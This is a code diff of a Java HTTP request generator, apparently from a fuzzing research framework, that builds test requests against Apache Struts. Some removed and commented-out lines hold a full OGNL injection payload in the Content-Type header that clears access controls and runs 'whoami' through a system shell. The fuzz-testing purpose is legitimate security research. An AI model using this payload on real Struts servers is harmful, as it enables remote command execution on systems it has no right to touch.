@@ -69,70 +69,70 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
 
     }
 
-    private void getStrutsHeaders(RequestBuilder builder, SourceOfRandomness random, GenerationStatus status, String body) {
-
-
-        Boolean injectOGNLInHeaders = random.nextBoolean();
-
-        Set<String> staticHeaders = new HashSet<>();
-        staticHeaders.add("Host");
-        staticHeaders.add("Content-Type");
-        staticHeaders.add("Content-Length");
-
-
-        // Must have these headers to mke valid request
-        builder.addHeader("Host", (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? this.OGNLInjectionStrings.generate(random, status) :"any");
-        builder.addHeader("Content-Type", (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? this.OGNLInjectionStrings.generate(random, status) : "application/x-www-form-urlencoded");
-
-        builder.addHeader("Content-Length", String.valueOf(body.length()));
-
-
-
-        // Add more headers - make sure not to step over the ones we need
-        int index = random.nextInt(max_elements);
-        int i = 0;
-
-        boolean coin = random.nextBoolean();
-        int choice = random.nextInt(0, Integer.MAX_VALUE);
-
-
-
-        while(i< index) {
-            String newHeader = "";
-            String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInput();
-
-            if (hints != null && hints.length > 0 && coin) {
-                choice = choice % hints.length;
-                newHeader = new String(hints[choice]);
-                newHeader = applyTaints(newHeader, choice);
-            } else {
-                newHeader = makeString(random, status);
-                newHeader = applyTaints(newHeader, i);
-            }
-
-
-            coin = random.nextBoolean();
-            choice = random.nextInt(0, Integer.MAX_VALUE);
-            if(!staticHeaders.contains(newHeader)) {
-
-                String val = "";
-
-
-                if (hints != null && hints.length > 0 && coin) {
-                    choice = choice % hints.length;
-                    val = hints[choice];
-                    val = applyTaints(val, choice);
-                } else {
-                    val = makeMultiLineString(random, status);
-                    val = applyTaints(val, choice);
-                }
-
-                newHeader = applyTaints(newHeader, i);
-                builder.addHeader(newHeader, (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? OGNLInjectionStrings.generate(random, status) :val);
-                i++;
-            }
-        }
-    }
+//    private void getStrutsHeaders(RequestBuilder builder, SourceOfRandomness random, GenerationStatus status, String body) {
+//
+//
+//        Boolean injectOGNLInHeaders = random.nextBoolean();
+//
+//        Set<String> staticHeaders = new HashSet<>();
+//        staticHeaders.add("Host");
+//        staticHeaders.add("Content-Type");
+//        staticHeaders.add("Content-Length");
+//
+//
+//        // Must have these headers to mke valid request
+//        builder.addHeader("Host", (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? this.OGNLInjectionStrings.generate(random, status) :"any");
+//        builder.addHeader("Content-Type", (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? this.OGNLInjectionStrings.generate(random, status) : "application/x-www-form-urlencoded");
+//
+//        builder.addHeader("Content-Length", String.valueOf(body.length()));
+//
+//
+//
+//        // Add more headers - make sure not to step over the ones we need
+//        int index = random.nextInt(max_elements);
+//        int i = 0;
+//
+//        boolean coin = random.nextBoolean();
+//        int choice = random.nextInt(0, Integer.MAX_VALUE);
+//
+//
+//
+//        while(i< index) {
+//            String newHeader = "";
+//            String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInput();
+//
+//            if (hints != null && hints.length > 0 && coin) {
+//                choice = choice % hints.length;
+//                newHeader = new String(hints[choice]);
+//                newHeader = applyTaints(newHeader, choice);
+//            } else {
+//                newHeader = makeString(random, status);
+//                newHeader = applyTaints(newHeader, i);
+//            }
+//
+//
+//            coin = random.nextBoolean();
+//            choice = random.nextInt(0, Integer.MAX_VALUE);
+//            if(!staticHeaders.contains(newHeader)) {
+//
+//                String val = "";
+//
+//
+//                if (hints != null && hints.length > 0 && coin) {
+//                    choice = choice % hints.length;
+//                    val = hints[choice];
+//                    val = applyTaints(val, choice);
+//                } else {
+//                    val = makeMultiLineString(random, status);
+//                    val = applyTaints(val, choice);
+//                }
+//
+//                newHeader = applyTaints(newHeader, i);
+//                builder.addHeader(newHeader, (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? OGNLInjectionStrings.generate(random, status) :val);
+//                i++;
+//            }
+//        }
+//    }
 
     private String createHeaderString(String headerType, String headerVal) {
         return headerType + ": " + headerVal + "\r\n";
@@ -212,65 +212,90 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
 
     @Override
     public String generate(SourceOfRandomness random, GenerationStatus status) {
-        RequestBuilder builder = this.getReqType(random, status);
-        String url = builder.getUri().toString();
-        String body = this.getBody(random, status, url);
-        getStrutsHeaders(builder,random,status,body);
+        //RequestBuilder builder = this.getReqType(random, status);
+       // String url = builder.getUri().toString();
+        //String body = this.getBody(random, status, url);
+       // getStrutsHeaders(builder,random,status,body);
 
         // getParameters(builder,random,status);
-        HttpUriRequest req =  builder.build();
+     //   HttpUriRequest req =  builder.build();
 
 
        // String request = req.toString() + "\r\n";
 
-        String request = getReqTypeString(random) + "\r\n";
+//        String request = getReqTypeString(random) + "\r\n";
 
-        Header[] headerFields = req.getAllHeaders();
+       // Header[] headerFields = req.getAllHeaders();
 
-        ArrayList<String> headerStrings = getStrutsHeaderStrings(random, status, body);
-        for (int i = 0; i < headerStrings.size(); i++) {
+//        ArrayList<String> headerStrings = getStrutsHeaderStrings(random, status, body);
+//        for (int i = 0; i < headerStrings.size(); i++) {
+//
+//
+//            request += headerStrings.get(i);
+//        }
+//        request += "\r\n";
+//        request += body;
+//        request += "\r\n\r\n";
+//
+//        this.OGNLInjectionDone = false;
 
+        String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInputGlobal();
 
-            request += headerStrings.get(i);
-        }
-        request += "\r\n";
-        request += body;
-        request += "\r\n\r\n";
-
-        this.OGNLInjectionDone = false;
-
-        String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInput();
 
         String word ="";
 
         int choice = random.nextInt(65535);
-
         boolean coin = random.nextBoolean();
-        if(coin) {
-            if (hints != null && hints.length > 0) {
+
+        if (hints != null && hints.length > 0) {
+
+//            if(coin) {
+                System.out.println("HINTS WAS NOT NULL FOR CONTENT TYPE! RECEIVED STRINGS");
+                for(int i = 0; i < hints.length; i++) {
+                    System.out.println(hints[i]);
+                }
                 choice = choice % hints.length;
-                word = hints[choice];
+
+                StringEqualsHintingInputStream.hintUsedInCurrentInput = true;
+
+            choice = random.nextInt(3);
+            switch (choice) {
+//
+//                    case 0:
+//                        word = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
+//                        break;
+                case 0:
+                    word = "(multipart/form-data)";
+                    break;
+                case 1:
+                    word = "{multipart/form-data}";
+                    break;
+                case 2:
+                    word = "[multipart/form-data]";
+                    break;
             }
+
+//            }
         }
         else {
-                choice = random.nextInt(3);
+                choice = random.nextInt(2);
                 switch (choice) {
-
+//
+//                    case 0:
+//                        word = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
+//                        break;
                     case 0:
-                        word = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
-                        break;
-                    case 1:
                         word = "text/html";
                         break;
-                    case 2:
+                    case 1:
                         word = "testing";
                         break;
                 }
         }
 
-        request = getReqTypeString(random) + "\r\n" +
+        String request = getReqTypeString(random) + "\r\n" +
                 "Host: any\r\n" +
-                "Content-Type:" + applyTaints(word, choice) + "\r\n" +
+                "Content-Type: " + applyTaints(word, choice) + "\r\n" +
                 "Content-Length: 0\r\n\r\n" + "\r\n\r\n";
         return request;
     }
@@ -373,29 +398,64 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
         ArrayList<String> urlVals = getDictionaryValues("dictionaries/struts-showcase-validUrls.dict");
 
 
-        String url = chooseAndTaint(urlVals, random);
+        String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInputGlobal();
 
-        int index = random.nextInt(2);
-        String result = "";
-        switch(index) {
-            case 0:
-                result = "GET" ;// RequestBuilder.get(this.validUrlGenerator.generate(random, status));
-                break;
-            case 1:
-                result = "POST"; //RequestBuilder.post(this.validUrlGenerator.generate(random, status));
-                break;
-            case 2:
-                result = "HEAD"; //return RequestBuilder.head(this.validUrlGenerator.generate(random, status));
-                break;
-            case 3:
-                result = "DELETE"; //return RequestBuilder.delete(this.validUrlGenerator.generate(random, status));
-                break;
-            case 4:
-                result = "TRACE"; //return RequestBuilder.trace(this.validUrlGenerator.generate(random, status));
-                break;
+        boolean coin = random.nextBoolean();
+        if(coin) {
+            if (hints != null && hints.length > 0) {
+                System.out.println("HINTS WAS NOT NULL FOR URL!! RECEIVED STRINGS");
+                for (int i = 0; i < hints.length; i++) {
+                    System.out.println(hints[i]);
+                }
+            }
         }
 
-        result = applyTaints(result, index);
+
+        String url = chooseAndTaint(urlVals, random);
+
+
+
+        hints = StringEqualsHintingInputStream.getHintsForCurrentInputGlobal();
+
+        String result = "";
+        int choice = random.nextInt(65535);
+
+
+        if (false && hints != null && hints.length > 0) {
+            coin = random.nextBoolean();
+            if(coin) {
+                System.out.println("HINTS WAS NOT NULL FOR REQ TYPE!! RECEIVED STRINGS");
+                for (int i = 0; i < hints.length; i++) {
+                    System.out.println(hints[i]);
+                }
+                choice = choice % hints.length;
+                result = hints[choice];
+            }
+        }
+
+        else {
+            choice = random.nextInt(2);
+            switch (choice) {
+                case 0:
+                    result = "GET";// RequestBuilder.get(this.validUrlGenerator.generate(random, status));
+                    break;
+                case 1:
+                    result = "POST"; //RequestBuilder.post(this.validUrlGenerator.generate(random, status));
+                    break;
+                case 2:
+                    result = "HEAD"; //return RequestBuilder.head(this.validUrlGenerator.generate(random, status));
+                    break;
+                case 3:
+                    result = "DELETE"; //return RequestBuilder.delete(this.validUrlGenerator.generate(random, status));
+                    break;
+                case 4:
+                    result = "TRACE"; //return RequestBuilder.trace(this.validUrlGenerator.generate(random, status));
+                    break;
+            }
+
+        }
+
+        result = applyTaints(result, choice);
         result += (" " + url + " HTTP/1.1");
 //        result = applyTaints(result, index);
         return result;
